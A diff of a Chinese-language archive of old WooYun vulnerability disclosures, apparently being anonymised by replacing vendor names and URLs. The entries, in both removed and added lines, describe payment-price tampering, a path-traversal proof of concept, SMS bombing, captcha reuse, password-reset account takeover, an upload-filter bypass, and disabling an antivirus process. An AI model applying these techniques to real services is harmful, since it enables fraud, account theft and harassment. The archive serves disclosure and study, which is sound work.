+**详情**: 手机某互联网公司新增假面狂欢夜，我等屌丝岂能错过偶遇白富美的机会，果断抄起手机开始语音。。半天没遇到个妹子，唉，苦逼了。。躺下来歇会，我尼玛，这都是大叔哪行啊，猥琐流走起，掀起我的大板砖电脑进行抓包不错，开始语音，随机匹配陌生人，据官方说是“神秘夜话，语音通话不留痕”以下是抓包结果：里边有uin字段，既是匹配陌生人的某互联网公司号啦，所谓的假面狂欢夜，其实并不是找不到的。。只可惜这两个都是汉子啊，不信？有图为证啊，本人亲自做了验证这大哥不诚实，说是点了两下，得持续一个多小时。。。好不容易碰到个妹子，没聊就给我挂了，找到她的某互联网公司我尼玛，某互联网公司验证消息，你爱谁？我尼玛哪知道，难不成是隔壁老王？不对呀，算了，放弃了。。22万多人，我就不信没有妹子，我得赶紧进被窝语音了，哈哈哈，找我的白富美妹子去。。。
 
 **POC**: (见原文)
 
@@ -10951,7 +10951,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 简单来说问题有那么几个，1，支付的逻辑漏洞，任意金额支付。2，积分购物时，用户的积分数值由前台计算，可修改。3，再低级一点的，能负数支付啊，我买完东西钱包里还多了几块钱啊啊啊！任意金额支付：主页随便找一个商品，点击购买，抓包，，这里原价是2.38，改为2.39，然后下一步下一步，支付成功，ok。2，无限积分购物偶然发现还有个积分购物功能，寻思着看看怎么样呢，然后发现点击立即兑换的时候，根本没有网络请求，直接提示我积分不足，难道是在页面上取的值？重新加载页面，在页面里找到一个值，myjifen，还中英文一起。唉。现在是0，该成5000吧，完了就很神奇的可以兑换了。完了我的积分还成了-3000。3，负数支付，跟1一样，把商品价钱改为负数，选择钱包付款，这样钱包就能多出来好多钱了。如果选择支付宝付款的话会提示失败。
+**详情**: 简单来说问题有那么几个，1，支付的逻辑漏洞，任意金额支付。2，积分购物时，用户的积分数值由前台计算，可修改。3，再低级一点的，能负数支付啊，我买完东西钱包里还多了几块钱啊啊啊！任意金额支付：主页随便找一个商品，点击购买，抓包，，这里原价是2.38，改为2.39，然后下一步下一步，支付成功，ok。2，无限积分购物偶然发现还有个积分购物功能，寻思着看看怎么样呢，然后发现点击立即兑换的时候，根本没有网络请求，直接提示我积分不足，难道是在页面上取的值？重新加载页面，在页面里找到一个值，myjifen，还中英文一起。唉。现在是0，该成5000吧，完了就很神奇的可以兑换了。完了我的积分还成了-3000。3，负数支付，跟1一样，把商品价钱改为负数，选择钱包付款，这样钱包就能多出来好多钱了。如果选择某电商平台付款的话会提示失败。
 
 **POC**: 还有很多漏洞啊，比如说上面有的商家是需要付运费的，这个运费金额也是写在页面上的，可以抓返回包，修改那个运费金额（同样可以负数），支付，也没有问题。登陆的时候也没有验证码，对密码输入错误次数也没有限制，可以爆破，并且登陆的密码是明文传输的。
 
@@ -11041,7 +11041,7 @@
 
 **详情**: 验证码应该是一次性的,验证一次后,无论成功与否,都应该立即销毁那个会话中的验证码数据.否则同一个验证码多次使用.加验证码就没意义了.
 
-**POC**: 1. 打开 http://www.cnvd.org.cn/sites/main/twainindex/search_certificate3.htm2. 输入证书号和验证码3. 提交,看到证书.4. 点浏览器的后退按钮5. 无需改验证码,输入另一个证书号6. 提交,看到证书.此过程用程序实现也很容易,只要不请求验证码图片,输入的验证码就不用变.配合ocr或人肉辅助可以很轻松的实现自动或半自动的批量查询.
+**POC**: 1. 打开 https://example.com/[已脱敏] 输入证书号和验证码3. 提交,看到证书.4. 点浏览器的后退按钮5. 无需改验证码,输入另一个证书号6. 提交,看到证书.此过程用程序实现也很容易,只要不请求验证码图片,输入的验证码就不用变.配合ocr或人肉辅助可以很轻松的实现自动或半自动的批量查询.
 
 **绕过**: 直接利用
 
@@ -11105,9 +11105,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 从官网下载最新版本（摇钱树网吧管理软件大小：113M 版本：2014(920)发布日期：2014-11-12）和（摇钱树网吧管理软件 连锁网吧版 大小：121M 版本：2014(920) 发布日期：2014-11-22）发现均存在开放7111 web端口，该端口由barwebserv.exe程序提供服务。由于barwebserv.exe没充分过滤用户输入的../之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。http://www.soft.u7pk.com/Download.html(官网下载地址)还有各大软件下载站均提供下载，可见推广花了不少钱。。[华军][未来软件园][霏凡][统一下载][泡泡网][绿茶软件园][系统之家][软件天堂]http://www.onlinedown.net/soft/47089.htmhttp://www.orsoon.com/S
+**详情**: 从官网下载最新版本（摇钱树网吧管理软件大小：113M 版本：2014(920)发布日期：2014-11-12）和（摇钱树网吧管理软件 连锁网吧版 大小：121M 版本：2014(920) 发布日期：2014-11-22）发现均存在开放7111 web端口，该端口由barwebserv.exe程序提供服务。由于barwebserv.exe没充分过滤用户输入的../之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。https://example.com/[已脱敏])还有各大软件下载站均提供下载，可见推广花了不少钱。。[华军][未来软件园][霏凡][统一下载][某网站][绿茶软件园][系统之家][软件天堂]https://example.com/[已脱敏]
 
-**POC**: http://127.0.0.1:7111/../ver.txthttp://127.0.0.1:7111/../../../WINDOWS/ODBC.INI
+**POC**: http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -11115,8 +11115,8 @@
 ---
 
 ---
-### [wooyun-2011-01354] QQ2010正式版SP2.1(1861)个人资料生日BUG
-**厂商**: 腾讯 | **年份**: 2011 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2011-01354] 某互联网公司2010正式版SP2.1(1861)个人资料生日BUG
+**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -11159,8 +11159,8 @@
 ---
 
 ---
-### [wooyun-2015-098554] QQ堂游戏可在房间内让指定人掉线
-**厂商**: 腾讯 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2015-098554] 某互联网公司堂游戏可在房间内让指定人掉线
+**厂商**: 某互联网公司 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -11171,7 +11171,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 此漏洞已经编制成程序并发布在各大QQ堂社区，点击按钮即可让对方客户端直接关闭，性质十分恶劣，不少玩家都受到影响。
+**详情**: 此漏洞已经编制成程序并发布在各大某互联网公司堂社区，点击按钮即可让对方客户端直接关闭，性质十分恶劣，不少玩家都受到影响。
 
 **POC**: (见原文)
 
@@ -11203,8 +11203,8 @@
 ---
 
 ---
-### [wooyun-2012-011191] 一键绕过腾讯追踪的方法
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2012-011191] 一键绕过某互联网公司追踪的方法
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 认证接口
 
@@ -11215,13 +11215,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 腾讯不久前已经面向QQ手机令牌用户抢先推出了查询登录信息的功能，但是菲菲多次测试发现只要简单一键即可成功绕过安全中心的登录追踪记录。看来腾讯还有待进一步优化啊！~有时候就是这样防不胜防！在QQ安全中心登录信息查询服务中，基本上可以看到你最近一周内所有的登录类型和地点，不管是无线终端（手机QQ、3GQQ）还是电脑端的登陆情况都可以查出来。但是恰恰有一个地方系统却不会留下任何记录。到底是嘛呢？那就是iPad简版空间的登录入口，地址是： http://qzs.qq.com/qzone/mobile/login.html 。当然直接使用我们普通的电脑也可以直接访问的。从这个入口登录你的QQ帐号就不会在安全中心留下任何“蛛丝马迹”了！邮箱绕过追踪的地址是：http://wap.mail,qq.com小提示：只要在任意一个QQ入口登录成功，就会在浏览器留下登录状态，访问其他QQ产品就无需再重复登录了。
+**详情**: 某互联网公司不久前已经面向某互联网公司手机令牌用户抢先推出了查询登录信息的功能，但是菲菲多次测试发现只要简单一键即可成功绕过安全中心的登录追踪记录。看来某互联网公司还有待进一步优化啊！~有时候就是这样防不胜防！在某互联网公司安全中心登录信息查询服务中，基本上可以看到你最近一周内所有的登录类型和地点，不管是无线终端（手机某互联网公司、3G某互联网公司）还是电脑端的登陆情况都可以查出来。但是恰恰有一个地方系统却不会留下任何记录。到底是嘛呢？那就是iPad简版空间的登录入口，地址是： https://example.com/[已脱敏] 。当然直接使用我们普通的电脑也可以直接访问的。从这个入口登录你的某互联网公司帐号就不会在安全中心留下任何“蛛丝马迹”了！邮箱绕过追踪的地址是：https://example.com/[已脱敏]
 
-**POC**: http://qzs.qq.com/qzone/mobile/login.htmlhttp://wap.mail,qq.com
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 过滤绕过
 
-**修复**: 腾讯你懂得~
+**修复**: 某互联网公司你懂得~
 ---
 
 ---
@@ -11237,9 +11237,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1：缺陷urlhttp://www.17u.net/2：此处问题在于一些订单可以订大人和儿童票，我们构造-1的大人人数和正数的小孩人数使得钱数为正，即可提交订单成功3：构造订单截图，选取的是88元的票，-1的大人，2的小孩提交之后的结果：4：支付宝支付金额的图：
+**详情**: 1：缺陷urlhttps://example.com/[已脱敏]
 
-**POC**: 3：构造订单截图，选取的是88元的票，-1的大人，2的小孩提交之后的结果：4：支付宝支付金额的图：
+**POC**: 3：构造订单截图，选取的是88元的票，-1的大人，2的小孩提交之后的结果：4：某电商平台支付金额的图：
 
 **绕过**: 直接利用
 
@@ -11269,8 +11269,8 @@
 ---
 
 ---
-### [wooyun-2012-06783] 安卓微信微博文章推荐过滤html不严
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2012-06783] 安卓某互联网公司某社交平台文章推荐过滤html不严
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -11281,7 +11281,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 网页内容的html是以文本形式出现，微信读取的时候会执行
+**详情**: 网页内容的html是以文本形式出现，某互联网公司读取的时候会执行
 
 **POC**: (见原文)
 
@@ -11305,7 +11305,7 @@
 
 **详情**: 上海野生动物园支付漏洞，可一元购买商城中所有东西~我还没去过，厂商送两张票让我跟我的同桌小红一起去观光可好。。。
 
-**POC**: 请先注册一个号，作为测试用购买地址http://**.**.**.**/shop/index.php就买这个吧http://**.**.**.**/shop/proshow.php?NID=14成人票，价格120正常购物流程一直到这就要转到支付宝付款了！于是掏出Burpsuite抓包点击去支付这里的=120就是价格了，改成 =1 forward跳到支付宝支付页面咯~扫一扫即可支付成功~
+**POC**: 请先注册一个号，作为测试用购买地址http://**.**.**.**/shop/index.php就买这个吧http://**.**.**.**/shop/proshow.php?NID=14成人票，价格120正常购物流程一直到这就要转到某电商平台付款了！于是掏出Burpsuite抓包点击去支付这里的=120就是价格了，改成 =1 forward跳到某电商平台支付页面咯~扫一扫即可支付成功~
 
 **绕过**: 直接利用
 
@@ -11325,7 +11325,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 姿势一、大家还记得之前在zone上，有人将form-data改为f+orm-data进行绕过的case吗？所以google下Content-Disposition的value，发现有很多，每个都能上传成功，并且绕过。http://www.iana.org/assignments/cont-disp/cont-disp.xhtml#cont-disp-1最后，发现原来Content-Disposition的值可以为空。最后知道真相的我眼泪掉下来。------WebKitFormBoundarysnXY4rAshTKCPSr1Content-Disposition: name="file"; filename="bypass.php"Content-Type: application/octet-stream<?phpecho 'bypass safedog upload ';?>------
+**详情**: 姿势一、大家还记得之前在zone上，有人将form-data改为f+orm-data进行绕过的case吗？所以google下Content-Disposition的value，发现有很多，每个都能上传成功，并且绕过。https://example.com/[已脱敏] name="file"; filename="bypass.php"Content-Type: application/octet-stream<?phpecho 'bypass safedog upload ';?>------
 
 **POC**: (见原文)
 
@@ -11379,8 +11379,8 @@
 ---
 
 ---
-### [wooyun-2014-054208] 利用淘宝某活动套取现金（空手套白狼）
-**厂商**: 淘宝网 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2014-054208] 利用某电商平台某活动套取现金（空手套白狼）
+**厂商**: 某电商平台网 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -11391,7 +11391,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先去这里领取红包。http://trip.taobao.com/go/act/other/dxhb2014.php一般要么是50的要么是20的，然后到下面随便买一个机票，如果是50的红包那么你就购买两份保险，如果是20的呢，你就买一份保险就好了。然后填信息下单。不要付款然后用手机支付保险的款项。然后在去网站取消机票。保险的钱就自动返回到支付宝了。
+**详情**: 首先去这里领取红包。https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -11435,7 +11435,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 登录访问下面地址：http://my.ikang.com/pay/success?state=1&groupType=0&examId=20000111&connectMis=1&orderId=21051000&packCategory=1遍历orderId即可页面只能看到手机号和邮箱，简单遍历下有好多企业用户，你会说没有姓名，我们改下邮箱试试
+**详情**: 登录访问下面地址：https://example.com/[已脱敏]
 
 **POC**: 以youku的员工yangwei为例，真名叫杨微，时间地点也出来了，不知道体检完报告会不会发我邮箱里ID简单证明，大概有2000W+
 
@@ -11479,7 +11479,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.是个支付漏洞哦，主站http://www.aipai.com2.点击右上角的充值，进入页面http://www.aipai.com/pay.php3.为自己充1000元，35000爱拍币咯4.系统提示金额为1000元：
+**详情**: 1.是个支付漏洞哦，主站https://example.com/[已脱敏]
 
 **POC**: 5.点击确认支付，抓包看数据：6.上图中post的内容：rc_c=14735649&pd_FrpId=CMBCHINA-NET&payType=1&chargeMoney_1=1000&p0_Cmd=Buy&p2_Order=很明显看出来参数chargeMoney_1表示需要支付的金额嘛，改成1元啦；7.跳转到银行支付页面咯8.我的测试到这一步就结束啦，没有买任何东西哦！厂商请自查啦！
 
@@ -11533,8 +11533,8 @@
 ---
 
 ---
-### [wooyun-2013-038798] 中国电信某分站某处验证绕过可进行无限短信轰炸（二）
-**厂商**: 中国电信 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2013-038798] 某运营商某分站某处验证绕过可进行无限短信轰炸（二）
+**厂商**: 某运营商 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -11545,7 +11545,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://222.68.185.242:7080/mobileWT2/jwificheck.do怎么找到的呢？安卓的中国电信掌上营业厅，里面有个WIFI时长购买，点击就跳到这个网页。burp抓包，修改号码，repeat这个接口速度很快嘛，前端限制是60秒内只能发一条，我试了试burp直接发包，12条不到10秒钟，移动联通电信号码通杀，没有限制条数。
+**详情**: http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -11589,7 +11589,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 几位员工弱口令，进入系统后 可以查看公司各种敏感信息比如通讯录，工资，投资标准，标书等。。。没多翻 截了2张图证明一下 就出来了http://work.cybernaut.com.cn/seeyon/index.jsp密码： 123456弱口令 IDbaogang.sunchixian.linfangting.huangfeng.like.zhaomingsu.wang
+**详情**: 几位员工弱口令，进入系统后 可以查看公司各种敏感信息比如通讯录，工资，投资标准，标书等。。。没多翻 截了2张图证明一下 就出来了https://example.com/[已脱敏] 123456弱口令 IDbaogang.sunchixian.linfangting.huangfeng.like.zhaomingsu.wang
 
 **POC**: (见原文)
 
@@ -11644,7 +11644,7 @@
 
 ---
 ### [wooyun-2012-010089] 阿里旺旺显IP漏洞
-**厂商**: 阿里巴巴 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
+**厂商**: 某电商平台 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -11699,7 +11699,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 积分兑换功能存在逻辑漏洞，攻击者可以利用该逻辑漏洞兑换任意金额和数量的红包，投资的时候红包可以当RMB使用的，功能URL如下：https://www.jinhaidai.com/integral/conversion点立即兑换，抓包请求如下：POST /integral/onceconver?sub=10000&cge=0&dec=0 HTTP/1.1Host: www.jinhaidai.comJHD_CSRF_TOKEN=84a085480134a3949edcf917c744e0151c72e753将sub的值修改为10000，红包的金额就相当于1W元，然后将cge、dec的值都修改为0，继续点立即兑换，抓包如下：POST /integral/buyitem HTTP/1.1Host: www.jinhaidai.comJHD_CSRF_TOKEN=84a085480134a3949
+**详情**: 积分兑换功能存在逻辑漏洞，攻击者可以利用该逻辑漏洞兑换任意金额和数量的红包，投资的时候红包可以当RMB使用的，功能URL如下：https://example.com/[已脱敏] /integral/onceconver?sub=10000&cge=0&dec=0 HTTP/1.1Host: www.jinhaidai.comJHD_CSRF_TOKEN=84a085480134a3949edcf917c744e0151c72e753将sub的值修改为10000，红包的金额就相当于1W元，然后将cge、dec的值都修改为0，继续点立即兑换，抓包如下：POST /integral/buyitem HTTP/1.1Host: www.jinhaidai.comJHD_CSRF_TOKEN=84a085480134a3949
 
 **POC**: (见原文)
 
@@ -11789,7 +11789,7 @@
 
 **详情**: 业务逻辑缺陷，锁定功能完美绕过
 
-**POC**: 中行个人网银：https://ebsnew.boc.cn/boc15/login.html故意输入错误密码几次之后会被锁定，无法登录：然后是利用找回密码功能，此时可以选择修改密码（也可以就输入原来的正确密码）:结下来点那个 直接登录：成功绕过：但是如果退出，再正常登录，会提示本账户依然处于锁定状态：也就是说账户依然没有解锁，但还是正常登录了
+**POC**: 中行个人网银：https://example.com/[已脱敏] 直接登录：成功绕过：但是如果退出，再正常登录，会提示本账户依然处于锁定状态：也就是说账户依然没有解锁，但还是正常登录了
 
 **绕过**: 过滤绕过
 
@@ -11809,7 +11809,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: https://www.yypt.com/finance/regist!sendValidateCode.do?0.012081895545985044&mobile=150*******1https://www.yypt.com/finance/regist!sendValidateCode.do?0.18127401016843408&mobile=150********1抓的随机值直接get提交!可做成易语言代码 自动发送代码如下!https://www.yypt.com/finance/regist!sendValidateCode.do?"+时间_取随机时间戳 ()+"&mobile=
+**详情**: https://example.com/[已脱敏] 自动发送代码如下!https://example.com/[已脱敏]"+时间_取随机时间戳 ()+"&mobile=
 
 **POC**: (见原文)
 
@@ -11831,9 +11831,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 先了解爱康国宾（1）访问链接http://airchina.health.ikang.om/为国航定制，选择普通会员找回密码（2）第一步：输入身份证号和验证码，不要问我哪里来的身份证号，因为我是受害之一，我都以身试法，多给我点奖励哦。。（3）第二步：获取验证码（4）第三步：输入新密码，提交抓取该包（5）第四步：尝试使用任意会员卡号替代loginName值，提交请求，提示密码修改成功
+**详情**: 先了解爱康国宾（1）访问链接https://example.com/[已脱敏]
 
-**POC**: （6）使用00109000******70在爱康国宾会员登录页http://my.ikang.com/loginui使用新密码登陆，成功！！！这是我的同事啊，这网站等同于把真实姓名、手机号、身份证号、健康信息等个人资料放在网络上啊。。。。。
+**POC**: （6）使用00109000******70在爱康国宾会员登录页https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -11885,8 +11885,8 @@
 ---
 
 ---
-### [wooyun-2013-036975] 淘宝浏览器多个DLL劫持漏洞
-**厂商**: 阿里巴巴 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2013-036975] 某电商平台浏览器多个DLL劫持漏洞
+**厂商**: 某电商平台 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -11897,7 +11897,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 淘宝浏览器最新版（版本3.3.0.867），官方下载安装版本taobrowser(3.3.0.867)-bc-bjq.exe，windows xp sp4环境，淘宝浏览器的主程序在运行中浏览某些特定网页(如淘宝网自身)时会加载一个不带路径的dxva2.dll文件（该文件没有随淘宝浏览器一起安装），导致恶意攻击者可以伪造该DLL文件用于劫持，严重时可危害浏览器用户的安全，如帐号窃取、网络钓鱼等。原因在于浏览器的核心模块bluesky.dll(3.3.0.867)延迟导入一些如dxva2.dll、mf.dll、mfplat.dll文件，而这些文件没有随安装程序一起安装，留下可利用机会。
+**详情**: 某电商平台浏览器最新版（版本3.3.0.867），官方下载安装版本taobrowser([IP已脱敏])-bc-bjq.exe，windows xp sp4环境，某电商平台浏览器的主程序在运行中浏览某些特定网页(如某电商平台网自身)时会加载一个不带路径的dxva2.dll文件（该文件没有随某电商平台浏览器一起安装），导致恶意攻击者可以伪造该DLL文件用于劫持，严重时可危害浏览器用户的安全，如帐号窃取、网络钓鱼等。原因在于浏览器的核心模块bluesky.dll([IP已脱敏])延迟导入一些如dxva2.dll、mf.dll、mfplat.dll文件，而这些文件没有随安装程序一起安装，留下可利用机会。
 
 **POC**: (见原文)
 
@@ -12029,7 +12029,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 问题地址：继续教育学习卡http://cme.iiyi.com/pay/card_list随便选一个。这里有个逻辑，支付价钱=卡钱+运费10截断，抓包，改money参数为-9.8可以看到价格变为0.2元，支付去～付款成功，回去看看。购买成功卡号密码到手～
+**详情**: 问题地址：继续教育学习卡https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -12051,7 +12051,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 在这里下载http://www.jxds.gov.cn/portalV3/site/site/portal/jx/content_index.portal[contentId=268734][categoryId=3999][siteName=jx][categoryCode=001027001006002]下载安装完账号admin 密码123456可以选择所有的纳税人也就是说我们只要得到识别号+名称就可以设置通行密码只要打入纳税人识别号+单位名称就可以验证了然后去补下脑http://baike.1688.com/doc/view-d22569261.html例如411327176638773 第1-6为数字为河南省南阳市的税务代码7-15位数字为组织机构代码 这是重点输入这个果然。现在我们还缺单位名称我要弱弱地说 组织机构代码是可以查询的查询URL：http://www.nacao.or
+**详情**: 在这里下载https://example.com/[已脱敏]][categoryId=3999][siteName=jx][categoryCode=001027001006002]下载安装完账号admin 密码123456可以选择所有的纳税人也就是说我们只要得到识别号+名称就可以设置通行密码只要打入纳税人识别号+单位名称就可以验证了然后去补下脑https://example.com/[已脱敏] 第1-6为数字为河南省南阳市的税务代码7-15位数字为组织机构代码 这是重点输入这个果然。现在我们还缺单位名称我要弱弱地说 组织机构代码是可以查询的查询URL：https://example.com/[已脱敏]
 
 **POC**: 这个软件虽然是公开下载但是你用默认密码就不好了还让大众都知道你应该效仿中移动的缴费客户端，虽然提供下载，不过如果想以这个机构连接系统，是需要短信或密保验证的而这个税务客户端验证方式只有公开了的组织代码还有软件打开密码 别弄的谁都知道好伐，要低调的告诉缴纳人就好，应该是一个ip一个密码的~还是限制不严
 
@@ -12095,7 +12095,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 简单来说代码只有两行：GetProcessIdByName(L"kxetray.exe", &dwPID);DebugActiveProcess(dwPID);其中GetProcessIdByName只需用CreateToolhelp32Snapshot创建进程快照，并用Process32First和Process32Next遍历即可。DebugActiveProcess是API函数，其唯一参数是被调试进程的PID。我们只要不在退出前分离毒霸进程（被调试进程）就可以导致其退出。当然为了在其退出后继续运行，示例中采用了再运行一次自身的办法。源码、程序请见http://pan.baidu.com/s/1dDrJPWP。在Win8.1+VS2013+毒霸最新版下测试通过。
+**详情**: 简单来说代码只有两行：GetProcessIdByName(L"kxetray.exe", &dwPID);DebugActiveProcess(dwPID);其中GetProcessIdByName只需用CreateToolhelp32Snapshot创建进程快照，并用Process32First和Process32Next遍历即可。DebugActiveProcess是API函数，其唯一参数是被调试进程的PID。我们只要不在退出前分离毒霸进程（被调试进程）就可以导致其退出。当然为了在其退出后继续运行，示例中采用了再运行一次自身的办法。源码、程序请见https://example.com/[已脱敏]
 
 **POC**: 运行程序前：运行后：可以看到毒霸已经默默的退出了，但我们的程序（其实是被自身第二次运行的）正在运行。
 
@@ -12117,7 +12117,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 从http://www.immomogame.com/mmzb/ 下载陌陌争霸游戏的Android版，反编译之后在MDKWebLoginActivity.java中找到两个URL:https://game.immomo.com/register/?action=loginHorizontalPagehttps://game.immomo.com/register/?action=loginPage登录错误两次之后页面会出现验证码，然而该验证码并不过期，可以反复提交，并且可以改变陌陌号和密码后再次提交，接口不带sign签名等额外的校验。密文为一次MD5，由此可初步猜测，陌陌在数据库中保存了用户的明文密码，或一次MD5。登录的POST请求为：POST https://game.immomo.com/register/?action=login&uname= HTTP/1.1username={
+**详情**: 从https://example.com/[已脱敏] 下载陌陌争霸游戏的Android版，反编译之后在MDKWebLoginActivity.java中找到两个URL:https://example.com/[已脱敏] https://example.com/[已脱敏] HTTP/1.1username={
 
 **POC**: 直接在那网页上多点击几下就可以看到了。
 
@@ -12141,7 +12141,7 @@
 
 **详情**: 在订单的时候没有完全判断对方所输入的数字
 
-**POC**: http://eshop.inoherb.com/Product/ShopCart.aspx<input type="text" name="buycount_289" id="buycount_289" value="-3" class="amipt" readonly="readonly"> 修改这个数字买了这么多 才24元 真便宜呀真便宜就到这里吧我就不提交了嘿嘿
+**POC**: https://example.com/[已脱敏] type="text" name="buycount_289" id="buycount_289" value="-3" class="amipt" readonly="readonly"> 修改这个数字买了这么多 才24元 真便宜呀真便宜就到这里吧我就不提交了嘿嘿
 
 **绕过**: 直接利用
 
@@ -12183,7 +12183,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 公屏右键不能Unicode，新建文本，老样子，右键I-V，复制到输入框，假如我的IP是http://127.0.0.1（域名更好），然后在我的空间新建一个名字为moc.udiab.www的文件夹，该文件夹下可以是钓鱼，或者挂马页面，那么实际地址为：http://127.0.0.1/moc.udiab.www  经过Unicode编码，显示则为www.baidu.com/1.0.0.721//:ptth那么在某些大公会或者万人群发送则如下图：然后就有那么点意思了吧（纯域名效果更加），虽然点击后有你们的再次确认跳转，但实际中瞎了钛合金狗眼的人多的是，so.....
+**详情**: 公屏右键不能Unicode，新建文本，老样子，右键I-V，复制到输入框，假如我的IP是http://[IP已脱敏]（域名更好），然后在我的空间新建一个名字为moc.udiab.www的文件夹，该文件夹下可以是钓鱼，或者挂马页面，那么实际地址为：http://[IP已脱敏]  经过Unicode编码，显示则为www.baidu.com/[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -12227,9 +12227,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.xiangguo.com   随便买一个东西  burp截断改金额。。
+**详情**: https://example.com/[已脱敏]   随便买一个东西  burp截断改金额。。
 
-**POC**: 随便选择一个物品 在支付处截断    原价2198元选择支付宝支付  截断修改金额  为0.01元支付宝扫码支付支付成功坐等发货。。
+**POC**: 随便选择一个物品 在支付处截断    原价2198元选择某电商平台支付  截断修改金额  为0.01元某电商平台扫码支付支付成功坐等发货。。
 
 **绕过**: 截断攻击
 
@@ -12317,7 +12317,7 @@
 
 **详情**: 之前提交的被指出信息量不够，这次详细点，不是为了rank，而是感觉这个缺陷很严重！12329热线地区：南京地区（其他地区条件有限未做测试，可能江苏甚至更多地区也有问题）操作：在南京地区拨打12329公积金热线提示音：你好，欢迎拨打南京住房XXXXX，个人账户查询请按1，单位请按2 ...XXX..我们按1又有提示音：个人公积金查询请按1，个人补贴请按2 .....XXX...我们再按1又有提示音：个人查询基本信息请按1，个人明细请按2 .....XXX...我们接着按1提示音：请输入个人帐号，卡号或者身份证号，#号结束我们输入身份证号（南京身份证网上不难搜索到）提示音：请输入个人六位公积金帐号密码重点来了！这时候随便输入个6位数字即可这时候虽然密码错误，但是提示音会播报“此账户XXXXXXXXXX”密码错误，这个XXXXX就是对应的公积金账号，虽然我们输入的是身份证，但是他却把公积金帐号被
 
-**POC**: 身份证百度即可，不贴图了，下面贴个用这个方法成功登录的图
+**POC**: 身份证某搜索引擎即可，不贴图了，下面贴个用这个方法成功登录的图
 
 **绕过**: 直接利用
 
@@ -12337,7 +12337,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: targert_url=http://cget.zjwq.net/看来是电信的产品。存在验证问题：直接提示用户密码错误了。然后burp测试下：然后发现还是不会过期，上一个漏洞没有讲明白为何不会过期，因为正常访问的话验证码还是会刷新.后来仔细想了下，其实是这样的，我们进入页面OR刷新OR点击验证码的时候：都会有一个如下请求：但是当我们用burp的时候只会GO一个请求，然后接收一个response的内容，而不会像浏览器一样去解析这个response所以也就不会刷新验证码了。然后接下来就爆破下admin的密码：看来密码是55555，登陆试试。
+**详情**: targert_url=https://example.com/[已脱敏]
 
 **POC**: 已经证明，不过暂时不知道是否存在通用型，就只能搜到这个例子。
 
@@ -12381,9 +12381,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://115.com/file/clowu7ct
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://115.com/file/clowu7ct
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -12391,8 +12391,8 @@
 ---
 
 ---
-### [wooyun-2013-037374] 支付宝手机端手势解锁密码存储分析2
-**厂商**: 支付宝 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2013-037374] 某电商平台手机端手势解锁密码存储分析2
+**厂商**: 某电商平台 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
